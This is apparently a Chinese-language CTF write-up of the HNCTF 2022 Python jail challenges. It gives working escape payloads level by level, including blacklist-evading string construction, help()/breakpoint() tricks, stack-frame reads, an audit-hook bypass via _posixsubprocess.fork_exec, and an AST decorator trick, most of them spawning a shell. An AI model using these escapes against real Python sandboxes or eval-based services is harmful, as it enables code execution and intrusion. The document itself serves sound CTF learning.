## [HNCTF 2022 Week1]calc_jail_beginner(JAIL)
直接nc连接，看源码没有任何过滤，直接交给`eval()`了。
```
__import__('os').popen('cat /home/ctf/flag').read()
```
可以得到flag
## [HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)
这一关过滤了
```
' " ` i b
```
就可以用ascii码构造路径。
不可以用`import`了，就直接open用chr()函数拼接（这个前提是知道flag路径）
```
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```
也可以复杂一些
渐变过程
```
().__class__.__base__.__subclasses__()
getattr(().__class__, '__base__').__subclasses__()
getattr(getattr(().__class__,'__base__'),'__subclasses__')()
getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
# 执行这个可以发现os在倒数第四
接下来就是
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh')
getattr(getattr(getattr(getattr(().__class__,'__base__'),'__subclasses__')()[-4],'__init__'),'__globals__')['system']('sh')

getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))

```
这样就进了交互式界面。
再`ls cat flag`就行了。

## [HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)
这一关限制了长度<=13
而`open('flag').read()`的长度就超了，
可以用input拼接   
```
> eval(input()) # 长度刚好13
__import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ cat flag
flag=NSSCTF{16c09b84-f724-4b32-9ed6-b94adcc73b6a}
$
```
## [HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)
这一关更狠，限长为7，这里了解到在python交互式终端可以利用`help()`进行RCE。
参考https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Misc-227pts-hitchhike
在 Python 中，! 符号通常被用于 Jupyter Notebook 或类似的交互式环境中，用来执行系统命令，而help()正是个能交互式的界面
```
help()

os

!cat flag
```
输入`help()`，进入到help界面，然后随便找个模块，例如`os`输入，此时就会显示`os`模块的帮助页面，输入`!cat flag`就能能rce。
## [HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)
这一关ban了`"exec","input","eval"`并且长度还是限制为13。
先通过help()确定python版本是3.10。
Python中内置了一个名为breakpoint()的函数，在Python 3.7中引入，用于在调试模式下设置断点。使用breakpoint()函数会停止程序的执行，并在IDE或命令行中进入调试模式，可以单步执行程序，查看变量的值等。
执行breakpoint()就会进入`Pdb`
pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。
```
breakpoint()
__import__('os').popen('cat flag').read()
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL)
源码
```python
BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr']  
  
eval_func = eval  
  
for m in BANLIST:  
    del __builtins__.__dict__[m]  
  
del __loader__, __builtins__  
  
def filter(s):  
    not_allowed = set('"\'`')  
    return any(c in not_allowed for c in s)
```
过滤了`'__loader__', '__import__', 'compile', 'eval', 'exec', 'chr'`
和
```
' " ` 
```
chr被ban了，可以用`bytes([]).decode()`
如果知道flag路径的话直接
```
open(bytes([102,108,97,103]).decode()).read()
```
如果不知道
```
().__class__.__base__.__subclasses__()[137].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())
```
这样就可以rce了。
## [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)
如果把bytes给ban了，
dir()可以看到
```
['__builtins__', 'my_flag']
```
再
```
str().join(my_flag.flag_level5)
```
可以得到flag
或者可以
```
().__class__.__base__.__subclasses__()
```
看到bytes在第七个，索引值为6
```
().__class__.__base__.__subclasses__()[137].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```
## [HNCTF 2022 Week1]lake lake lake(JAIL)
`globals()` 方法返回一个字典，其中包含了当前模块中所有全局变量的键值对
```
1
globals()
可以看到一个key
这时再
2
a34af94e88aed5c34fb5ccfe08cd14ab
__import__('os').system('sh')
```
## [HNCTF 2022 Week1]l@ke l@ke l@ke(JAIL)
func限长为6,只能用help()了
help()配合__main__查看当前模块的值
```
help()

main()
```
可以拿到一个key，用这个key进入backdoor
```
__import__('os').system('sh')
```
## [HNCTF 2022 WEEK2]laKe laKe laKe(JAIL)
给到源码
```python
BLACKED_LIST = ['compile', 'eval', 'exec', 'open']
BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
```
这里要用到# python的sys.stdout重定向
https://blog.csdn.net/MTbaby/article/details/53159053
```
以下两行在事实上等价： 
sys.stdout.write('hello'+'\n') 
print 'hello'
```

```
以下两组在事实上等价： 
hi=raw_input('hello? ') 

print 'hello? ',
hi=sys.stdin.readline()[:-1]
```
可以用`__import__("sys").__stdout__.write()`来替代`print()` 输出
payload
```
__import__("sys").__stdout__.write(__import__("os").read(__import__("os").open("flag",__import__("os").O_RDONLY), 0x114).decode())
```
源码里是`input_data = eval_func(input(''),{},{})`传入了空的全局 / 局部变量，但 `__import__` 是**Python 内置的特殊函数**（不属于 `__builtins__` 可删除的范畴），即使环境为空也能调用；
这是以只读模式读取flag，并且读前0x114个字符，这样直接就执行并且打印出来了，就不用关那个猜数字的游戏了。
源码里这一句
```python
sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout
```
它把print的内容，源码里没有过滤了`os.read`和`os.open`
也可以顺着这个猜数字的思路来，
此处随机数的生成是采用`random.randint`来产生的。python的`random`模块使用梅森旋转法来生成随机数。由于程序未限制我们拿到`random`模块，所以我们可以先拿到`random`模块，再`random.getstate()`拿到随机数生成器的状态，再通过`random.setstate()`置随机数生成器状态为生成随机数之前的状态，最后`random.randint`生成一模一样的随机数。
但是这就要使用多条语句，eval只可以执行一条语句，在python3.8引入了海象运算符`:=`
在表达式左侧应用海象运算符，可以将该表达式的值赋给某个变量。另外，我们还可以用一个list来装这些表达式，这样表达式的值就会从左至右依次计算，就像我们写程序一样一行一行地执行。对于函数的实现，我们可以借助lambda表达式来完成。
这里我们使用list来写程序，然后把返回值放到最后一个元素，最后再加一个`[-1]`，就能返回随机数了：）
```
[random:=__import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
```
这样就可以拿到flag了。
## [HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)
这个依然可以用上一关预测随机数的方法。
也可以利用到python栈帧的特性，
```
int(str(__import__('sys')._getframe(1).f_locals["right_guesser_question_answer"]))
```
理解栈帧：Python 执行函数时，会为每个函数创建一个 “栈帧对象”，存储函数的执行环境（局部变量、参数、调用关系等）；
在 Python 执行过程中，栈帧（stack frame）是一个关键概念。栈帧代表函数调用的执行环境，包含了函数执行所需的所有信息，包括局部变量、操作数栈、返回地址等。每次函数调用都会创建一个新的栈帧，并将其压入调用栈（call stack）。函数执行完毕后，栈帧会被弹出调用栈。
正确答案在`right_guesser_question_answer`里，
这里要用到`_getframe`函数，它可以获取调用栈的帧对象，默认参数是0，但是在这里传入0的话会获取eval的调用栈帧，所以要deep一层。
```
__import__('sys')._getframe(1)
```
这里可以使用`__import__('sys').__stdout__.write`去进行标准输出，
```
__import__('sys').__stdout__.write(str(__import__('sys')._getframe(1)))
```
可以看到这里的frame对象指向了'/home/ctf/./server.py'这个file，那么直接调用f_locals属性查看变量  
```
__import__('sys').__stdout__.write(str(__import__('sys')._getframe(1).f_locals))
```
可以看到`right_guesser_question_answer`。所以最后payload是
```
int(str(__import__('sys')._getframe(1).f_locals["right_guesser_question_answer"]))
```
## [HNCTF 2022 WEEK2]4 byte command
限长为4字符。
直接
```
sh
```


## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL)
解法一
利用type获取bytes
```python
print(type(str(1).encode()))
```
输出`<class 'bytes'>`
```python
print((type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode())
```
输出`system`
所以payload
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())
```
解法二
```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
```
解法三
利用`__doc__`凑字符。
```python
print(().__doc__) 
```
输出
```
Built-in immutable sequence.

If no argument is given, the constructor returns an empty tuple.
If iterable is specified the tuple is initialized from iterable's items.

If the argument is a tuple, the return value is the same object.
```
所以`print(().__doc__[19])`就是`s`，从这里把需要的字符一个一个找出来。

```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)
用上一关的解法二依然可以用，
这一关的加号和`byte`都禁了，我们用`.__add__`来替换加号，依然用上一关
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())
```
这一关也可以用`__doc__`的方法，但除了用`+`拼接，还有其他的方法，
如字符串`1234`可以用这种方法得到
```
print(''.join(['1','2','3','4']))
```
这里的`''`可以用`str()`代替，
```
print(str().join(['1','2','3','4']))
```
最终payload
```
().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL)
这一关过滤了`type`
还有一种获取字符的方法
```
print(list(dict(system=123))[0])
```
这样可以获取`system`这个字符串，
payload
```
[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])
```
## [HNCTF 2022 WEEK2]calc_jail_beginner_level5(JAIL)
提示用`dir()`
```
> dir()  
['__builtins__', 'my_flag']  
```
看到有个my_flag，使用dir跟进  
```
> dir(my_flag)
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'flag_level5']
```
看到一个flag_level5  
继续跟进
```
> dir(my_flag.flag_level5)  
```
发现有个encode()方法。直接调用
```
my_flag.flag_level5.encode()  
```
## [HNCTF 2022 WEEK3]s@Fe safeeval(JAIL)  
```
Turing s@Fe mode: on  
Black List:  
  
[  
'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',  
'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',  
'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE',  
'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE',  
'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',  
'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE',  
'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT',  
'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION'  
]  
  
some code:  
  
import os  
import sys  
import traceback  
import pwnlib.util.safeeval as safeeval  
input_data = input('> ')  
print(expr(input_data))  
def expr(n):  
if TURING_PROTECT_SAFE:  
m = safeeval.test_expr(n, blocklist_codes)  
return eval(m)  
else:  
return safeeval.expr(n) 
``` 
给了部分代码，Black List ban掉了一些Python 字节码操作，这些操作大多与数据结构的修改、函数的创建和调用等功能相关。

但代码中真正起过滤作用的是pwnlib.util.safeeval，与BlackList相比仁慈地放出了MAKE_FUNCTION和CALL_FUNCTION两个字节码
所以直接用`lambda`表达式直接打匿名函数。
```
(lambda:__import__('os').system('sh'))()
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL)  

这题已经几乎把所有的hook给ban掉了。所以我们只能另寻他法。
参考wp https://ctftime.org/writeup/31883
也就是利用`_posixsubprocess.fork_exec`来RCE。不过这里需要注意到，不同的python版本的`_posixsubprocess.fork_exec`接受的参数个数可能不一样：例如我本地WSL的python版本为3.8.10，该函数接受17个参数；而远程python版本为3.10.6，该函数和上面的writeup接受21个参数。
而且注意到，如果我们直接`import _posixsubprocess`，会触发audit hook：

```text
Operation not permitted: import
```
但可以利用这个绕过
```
__builtins__['__loader__'].load_module('_posixsubprocess')
```
或者直接
```
__loader__.load_module('_posixsubprocess')
```
而且因为是多次`exec`，所以我们可以输入多行代码：
```py
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(JAIL)
这一关和上一关不同的是这一关只可以一次代码执行的机会，
这可以用python3.8引入的海象运算符和list弄出代码。
```
[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), _posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)] 
```
## [HNCTF 2022 WEEK3]calc_jail_beginner_level7(JAIL)
可见这道题是根据python抽象语法树（AST）来拦截输入的。
```
=================================================================================================
==           Welcome to the calc jail beginner level7,It's AST challenge                       ==
==           Menu list:                                                                        ==
==             [G]et the blacklist AST                                                         ==
==             [E]xecute the python code                                                       ==
==             [Q]uit jail challenge                                                           ==
=================================================================================================
E
Pls input your code: (last line must contain only --HNCTF)
1+1
--HNCTF
ERROR: Banned statement <ast.Expr object at 0x7fdc0447f6d0>
Press any key to continue
```
试着输入1+1发现ban了expr
不能`import`，不能定义函数，也不能用lambda表达式，但是可以执行多行代码。这个时候，我想到了类的定义。
```
E
Pls input your code: (last line must contain only --HNCTF)
@exec
@input
class X: pass
--HNCTF
check is passed!now the result is:
<class '__main__.X'>__import__('os').system('sh')
sh: 0: can't access tty; job control turned off
$ ls
```
这样就可以得到shell。
